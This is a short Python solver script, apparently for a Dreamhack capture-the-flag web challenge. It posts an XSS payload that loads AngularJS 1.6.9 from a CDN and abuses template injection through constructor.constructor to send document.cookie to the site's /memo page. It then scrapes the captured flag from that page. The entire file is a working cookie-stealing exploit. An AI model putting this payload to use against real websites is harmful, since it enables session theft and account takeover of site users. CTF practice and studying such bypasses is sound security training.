from bs4 import BeautifulSoup
import requests

URL = "http://host3.dreamhack.games:12401"
PAYLOAD = "/flag"
PRINT_FLAG = "/memo"

PAYLOAD_DATA = {
    'param' : '''<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.9/angular.min.js"></script><html ng-app>{{constructor.constructor("location.href='/memo?memo='+document.cookie;")()}}</html>'''
}

# 1. Execute Payload and Get Flag
requests.post(URL + PAYLOAD, data=PAYLOAD_DATA)

#2. Print Flag
resp = requests.get(URL + PRINT_FLAG)

soup = BeautifulSoup(resp.content,"html.parser")
pre = soup.find('pre')
flag = pre.contents[0]
print(flag)